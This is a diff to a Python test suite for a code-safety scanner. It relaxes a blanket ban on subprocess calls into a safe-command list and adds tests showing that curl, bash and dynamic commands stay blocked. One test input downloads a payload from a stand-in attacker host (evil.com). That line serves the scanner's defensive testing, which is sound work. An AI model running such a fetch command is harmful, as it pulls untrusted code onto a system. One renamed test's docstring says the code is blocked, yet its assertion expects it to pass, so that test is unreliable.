@@ -573,9 +573,14 @@ class TestCodeContentScanner:
         code = "plt.savefig('chart.png')"
         assert _check_code_safety(code) is None
 
-    def test_subprocess_now_blocked(self):
-        """A-5: subprocess.* is now blocked in code scanner."""
+    def test_subprocess_safe_cmds_allowed(self):
+        """6A: subprocess with safe commands (pip3, ls, etc.) is now allowed."""
         code = 'subprocess.run(["pip3", "install", "pandas"])'
+        assert _check_code_safety(code) is None
+
+    def test_subprocess_unsafe_cmd_blocked(self):
+        """6A: subprocess with unsafe commands (curl, wget, etc.) is still blocked."""
+        code = 'subprocess.run(["curl", "http://evil.com/payload"])'
         assert _check_code_safety(code) is not None
 
 
@@ -653,8 +658,8 @@ print("hello")
 '''
         assert _check_code_safety(code) is not None
 
-    def test_python_writing_safe_script_blocked_by_subprocess(self):
-        """A-5: subprocess.run is now blocked even with safe commands."""
+    def test_python_writing_safe_script_blocked_by_bash(self):
+        """6A: subprocess.run(["bash", ...]) is blocked — bash not in safe list."""
         code = '''
 from pathlib import Path
 import subprocess
@@ -672,12 +677,21 @@ print(f"Creating {filename}: {message}")
 '''
         assert _check_code_safety(code) is None
 
-    def test_python_subprocess_now_blocked(self):
-        """A-5: All subprocess.* calls are now blocked in code scanner."""
+    def test_python_subprocess_safe_cmds_allowed(self):
+        """6A: subprocess with safe commands (python3, npm) is now allowed."""
         code = '''
 import subprocess
 subprocess.run(["python3", "main.py"], capture_output=True)
 subprocess.run(["npm", "run", "build"])
+'''
+        assert _check_code_safety(code) is None
+
+    def test_python_subprocess_dynamic_cmd_blocked(self):
+        """6A: subprocess with dynamic/variable commands is blocked."""
+        code = '''
+import subprocess
+cmd = get_command()
+subprocess.run(cmd)
 '''
         assert _check_code_safety(code) is not None
 
